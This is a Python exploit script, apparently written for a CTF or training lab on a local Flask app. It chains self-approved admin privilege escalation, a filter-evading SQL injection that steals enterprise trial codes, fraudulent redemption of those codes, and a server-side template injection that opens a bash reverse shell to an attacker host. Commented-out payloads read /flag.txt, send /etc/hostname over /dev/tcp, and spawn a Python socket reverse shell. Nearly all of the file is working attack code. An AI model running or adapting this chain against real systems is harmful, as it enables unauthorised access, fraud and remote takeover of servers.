import base64
from http.server import BaseHTTPRequestHandler, HTTPServer
import random
import re
import string
import subprocess
import sys
import time
import requests
import threading
import argparse
from urllib.parse import urlparse, parse_qs

# @bp.route("/register", methods=["GET", "POST"])  注册用户  无需邮箱激活

# @bp.route("/login", methods=["GET", "POST"]) 

# 申请

# @bp.route("/api/v1/team/role-requests", methods=["POST"]) 提权漏洞 可改为 operator 或admin

# 批准

# @bp.route("/api/v1/team/role-requests/int:rid/approve", methods=["POST"])

# SQL注入漏洞

# @bp.route("/api/v1/analytics/monitors/search") 有过滤 

# @bp.route("/api/v1/billing/trials/redeem", methods=["POST"])  使用试用码 获得企业版订阅

#@bp.route("/api/v1/integrations/int:iid/sync", methods=["POST"])  legacy模式 可以渲染自定义模版#


requests.packages.urllib3.disable_warnings()

BASE_URL = "http://127.0.0.1:5000"
PROXY = "http://127.0.0.1:8080" 
MY_USER = f"liam_{random.randint(1000, 9999)}"
MY_PASS = "liam123"
USE_PROXY = False 
proxies = {
        "http": PROXY,
        "https": PROXY,  # 如果目标是 HTTPS 也加上
    } if USE_PROXY else None



def get_session():
    """初始化会话并设置全局代理/配置"""
    session = requests.Session()
    if proxies:
        session.proxies.update(proxies)

    session.verify = False  # 全局禁用 SSL 校验
    return session

def reg_and_log(session):
    try:
        regurl = f"{BASE_URL}/register"
        regdata = {
            "username":MY_USER,
            "password":MY_PASS
        }
        reg_res = session.post(
            regurl,
            data=regdata , 
            proxies=proxies, 
            timeout=5 ,
            verify=False , 
            allow_redirects=False
            )

        if reg_res.status_code != 302:
            print(f"[-] Registration failed for '{MY_USER}'. HTTP Status: {reg_res.status_code}")
            return False

        print(f"[+] User '{MY_USER}' registered successfully.")
        login_url = f"{BASE_URL}/login"
        login_data = {
            "username": MY_USER,
            "password": MY_PASS
        }
        
        login_res = session.post(
            login_url, 
            data=login_data, 
            proxies=proxies, 
            timeout=5, 
            verify=False,
            allow_redirects=False
        )

        if login_res.status_code == 302 and "dashboard" in login_res.headers.get("Location", ""):
            print(f"[+] Logged in successfully as '{MY_USER}'")
            return True
        else:
            print(f"[-] Login failed for '{MY_USER}'. HTTP Status: {login_res.status_code}")
            return False


    except Exception as e:
        print(f"[-] Error in reg_and_log(): {e}")
        return False

def priv(session):
    try:
        # 1. 发送角色申请 (Send role request)
        role_url = f"{BASE_URL}/api/v1/team/role-requests"
        res1 = session.post(role_url, json={"requested_role": "admin"}, proxies=proxies, timeout=5 ,verify=False)
        
        # 提取 rid
        rid = res1.json().get("id")
        if not rid:
            print("[-] Failed to get request ID")
            return False
        print(f"[+] Got role request ID: {rid}")

        # 2. 发送越权/自我批准请求 (Self-approve request)
        approve_url = f"{BASE_URL}/api/v1/team/role-requests/{rid}/approve"
        res2 = session.post(approve_url, json={}, proxies=proxies, timeout=5 ,verify=False)


        if res2.status_code == 200 and res2.json().get("approved"):
            print("[+] Role request approved successfully!")
            return True
        else:
            print(f"[-] Approval failed: {res2.text}")
            return False

    except Exception as e:
        print(f"[-] Error in priv(): {e}")
        return False


def sqli(session):

    # sql = "SELECT id, name, status FROM monitors WHERE name LIKE '%" + sanitized_query + "%' ORDER BY name"
    # payload = SELECT id, name, status FROM monitors WHERE name LIKE 'x' UNI/**/ON SEL/**/ECT code, 'x', 'x' FROM trial_codes WHERE code LIKE '%%' ORDER BY name

    try:

        sql_url = f"{BASE_URL}/api/v1/analytics/monitors/search"
        sqli_payload = f"x' UNI/**/ON SEL/**/ECT code, 'x', 'x' FROM trial_codes WHERE code LIKE '%"
        params= {
            "q":sqli_payload
        }
        sqli_res = session.get(
            sql_url,
            params=params,
            proxies=proxies, 
            timeout=5, 
            verify=False,
            allow_redirects=False
        )
        match = re.search(r'ENTERPRISE-TRIAL-[A-Z0-9]+', sqli_res.text)
        if not match:
            print(f"[-] SQLi regex: no 'ENTERPRISE-TRIAL-...' in response.")
            print(f"[*] Response snippet: {sqli_res.text[:200]}")
            return False
        trial_code = match.group(0)

    

    except Exception as e:

        print(f"[-] Error in sql(): {e}")
        return False

    return trial_code

def redeem(session):
    try:
        redeem_url = f"{BASE_URL}/api/v1/billing/trials/redeem"
        code = sqli(session)
        redeem_data = {
                "code":code
        }

        redeem_res = session.post(
            redeem_url,
            json = redeem_data,
            proxies=proxies, 
            timeout=5, 
            verify=False,
            allow_redirects=False
        )

        if redeem_res.status_code == 200 and redeem_res.json().get("plan") == "enterprise":
            print(f"[+] Trial code '{code}' redeemed successfully!")
            print("[+] Plan upgraded to 'enterprise'!")
            return True
        else:
            print(f"[-] Redeem failed | HTTP {redeem_res.status_code}: {redeem_res.text}")
            return False
        
    except Exception as e:

        print(f"[-] Error in sql(): {e}")
        return False  

def get_iid(session):

    try:
        iid_url = f"{BASE_URL}/api/v1/integrations"
        

        iid_res = session.post(
                    iid_url,
                    json ={},
                    proxies=proxies, 
                    timeout=5, 
                    verify=False,
                    allow_redirects=False
                )
        iid = iid_res.json().get("id")
        print(f"[+] IID: {iid}")

    except Exception as e:
      
        print(f"[-] Error in iid(): {e}")
        return False  

    return iid


def rce(session,lhost,lport):
    try:
        iid =  get_iid(session)
        if not iid:
            print("[-] Failed to get integration ID")
            return False
        legacy_url = f"{BASE_URL}/api/v1/integrations/{iid}"
        json = {
            "render_mode":"legacy"

        }
        legacy_res = session.patch(
            legacy_url,
            json = json,
            proxies=proxies, 
            timeout=5, 
            verify=False,
            allow_redirects=False
        )
        if legacy_res.status_code == 200 and legacy_res.json().get("updated") == True:
            print(f"[+] legacy successfully!")
           
        else:
            print(f"[-] legacy failed | HTTP {legacy_res.status_code}: {legacy_res.text}")
            return False


        ssti_url = f"{BASE_URL}/api/v1/integrations/{iid}/sync"
        #ssti_payload ="{{get_flashed_messages.__globals__['os'].popen('cat /flag.txt').read()}}"
        #ssti_payload ="{{get_flashed_messages.__globals__['os'].popen('cat /etc/hostname >& /dev/tcp/172.18.0.1/5555').read()}}"
        #"{{ get_flashed_messages.__globals__['os'].popen('python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect((\'172.18.0.1\',5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'bash\'])\"').read() }}"

        ssti_payload =(
            "{{ get_flashed_messages.__globals__['os'].popen("
            f"'bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"'"
            ").read() }}"
        )
        ssti_data = {
            "custom_payload_blueprint":ssti_payload 
        }
        ssti_res = session.post(
            ssti_url,
            json=ssti_data,
            proxies=proxies,
            timeout=5,
            verify=False
        )

        if ssti_res.status_code != 200 or "enqueued" not in ssti_res.text:
            print(f"[-] SSTI payload execution failed | HTTP {ssti_res.status_code}: {ssti_res.text}")
            return False

        print("[+] SSTI payload submitted and task enqueued successfully!")
        return True

#https://openeuler.csdn.net/69ef2e7c54b52172bc70502a.html#devmenu9
#https://www.cnblogs.com/hetianlab/p/17273687.html

#https://github.com/H3rmesk1t/Security-Learning/blob/main/PythonSec/Python%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Python%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5.md



    except Exception as e:
      
        print(f"[-] Error in ssti(): {e}")
        return False 




def man():

    parser = argparse.ArgumentParser(description="code injection")
    #parser.add_argument("-t", "--target", required=True, help="Target URL (e.g., http://192.168.169.162)")
    parser.add_argument("-l", "--lhost", required=True, help="Local IP for listener (e.g., 192.168.119.169)")
    parser.add_argument("-p", "--lport", required=True, help="Local Port for listener (e.g., 8000)")
    # parser.add_argument("-s", "--shell_port", required=True, help="shell Port for listener (e.g., 4444)")
    args = parser.parse_args()


    lhost = args.lhost
    lport = int(args.lport)


    session  = get_session()
    if not reg_and_log(session):
        return
    if not priv(session):
        return
    if not redeem(session):
        return
    rce(session, lhost, lport)

if __name__ == "__main__":
    man()